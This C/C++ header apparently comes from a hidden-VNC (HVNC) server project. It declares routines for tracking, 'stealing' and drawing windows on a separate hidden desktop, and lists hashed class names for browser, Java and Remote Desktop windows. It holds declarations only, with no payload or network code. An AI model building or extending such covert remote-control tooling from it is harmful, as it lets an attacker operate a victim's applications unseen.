#ifndef WINDOWS_H_INCLUDED
#define WINDOWS_H_INCLUDED

HWND FindWnd(HWND hParent,TCHAR *lpClass,TCHAR *lpText);

HWND GetTopPopupWindow(PHVNC lpServer,HWND hWnd);
HWND _WindowFromPoint(PHVNC lpServer,POINT pt,WORD *wHitTest,WORD wDeep=0);
bool IsStyleHaveSizeBorders(LONG_PTR dwStyle);
HWND GetWindowFocus(HWND hWnd);
void DestroyMenus(PHVNC lpServer,HWND hWnd);
void SetForegroundWnd(PHVNC lpServer,HWND hWnd);

WORD GetWindowClassFlags(PHVNC lpServer,HWND hWnd);
int GetClassHash(HWND hWnd);

struct WND_CLASS_INFO
{
    int dwClassHash;
    WORD wMethod;
};

void SendMessageBroadcast(PHVNC lpServer,UINT uMsg,WPARAM wParam,LPARAM lParam);
HWND RealWindowFromPoint(PHVNC lpServer,POINT pt);
bool IsWindowEx(PHVNC lpServer,HWND hWnd);
void SetThreadDesktopEx(HDESK hDesktop);
bool IsMDI(HWND hWnd);

#define WCF_MOUSE_AUTOCAPTURE       0x001
#define WCF_MOUSE_CLIENT_TO_SCREEN  0x002
#define WCF_PAINTMETHOD_NOP         0x004
#define WCF_PAINT_ON_TOP            0x008
#define WCF_NO_CAPTURE              0x010
#define WCF_MENU                    0x020
#define WCF_JAVA                    0x040
#define WCF_PAINT_ALWAYS_BOTTOM     0x080
#define WCF_NEVERCLOSE              0x100
#define WCF_IGNOREWINDOW            0x200
#define WCF_STOLENWINDOW            0x400
#define WCF_STARTMENU               0x800

#define HASH_MENU                   0x0C63FEB9 //#32768
#define HASH_SYSSHADOW              0x00510FA8 //SysShadow
#define HASH_BASEBAR                0x8E29E9A7 //BaseBar
#define HASH_TOOLTIP32              0x7255C974 //tooltips_class32
#define HASH_BUTTON                 0x3DAAA90B //button
#define HASH_STARMENU               0x9BE8214B //D2VControlHost
#define HASH_DESK                   0xD323FBEF //Progman
#define HASH_MOZILLAMENU            0x800367F8 //MozillaDropShadowWindowClass
#define HASH_AWTPLUGIN              0x285B6568 //SunAwtPlugin
#define HASH_AWTFRAME               0xE04A99F6 //SunAwtFrame
#define HASH_AWTCANVAS              0x14C13799 //SunAwtCanvas
#define HASH_AWTDIALOG              0xF43F83E3 //SunAwtDialog
#define HASH_QPOPUP                 0x7BFAC6B0 //QPopup
#define HASH_DEFVIEW                0x8BB9FD5B //SHELLDLL_DefView
#define HASH_WORKERW                0x4B93A08D //WorkerW
#define HASH_IME                    0xC36BEB0A //IME
#define HASH_MSCTFIMEUI             0xE1AF2364 //MSCTFIME UI
#define HASH_GDIPHOOKWND            0xF7DC2308 //GDI+ Hook Window Class
#define HASH_AUTOSUGGEST            0x7D2BA740 //Auto-Suggest Dropdown
#define HASH_IHWINDOWCLASS          0x3E05CF56 //IHWindowClass
#define HASH_BBARWINDOWCLASS        0x336B357E //BBarWindowClass
#define HASH_TSCSHELLCONTCLASS      0xB2A1979A //TscShellContainerClass
#define HASH_IESERVER               0xDBC2E831 //Internet Explorer_Server


void GetOwner(PHVNC lpServer,Z_ORDER_LIST_ITEM *lpWnd);
Z_ORDER_LIST_ITEM *GetWndFromList(PHVNC lpServer,HWND hWnd);
Z_ORDER_LIST_ITEM *AppendWndToList(PHVNC lpServer,HWND hWnd,bool bStolen=false);

void SetFrgWnd(PHVNC lpServer,HWND hWnd);
void RefreshList(PHVNC lpServer);
void DeleteWndFromList(PHVNC lpServer,HWND hWnd);
bool CheckWindowStyle(PHVNC lpServer,HWND hWnd);

typedef int (__stdcall *_MessageBoxTimeout)(IN HWND hWnd, IN char *lpText,IN char *lpCaption, IN UINT uType,IN WORD wLanguageId, IN DWORD dwMilliseconds);
extern _MessageBoxTimeout MessageBoxTimeout;

struct CURSOR_INFO
{
    POINT pt;
    DWORD dwArea;
    HWND hGlobalWnd;
    PHVNC lpServer;
};

#define HVNC_MSG_TITLE "#hvnc"

bool IsWindowVisibleEx(PHVNC lpServer,HWND hWnd);
bool IsWindowInFullScreenMode(PHVNC lpServer,HWND hWnd);

#define IsFullScreen(hWnd) ((IsWindowInFullScreenMode(lpServer,hWnd)) && (hWnd == lpServer->lpGlobalVNCData->hForegroundWnd))

#endif // WINDOWS_H_INCLUDED
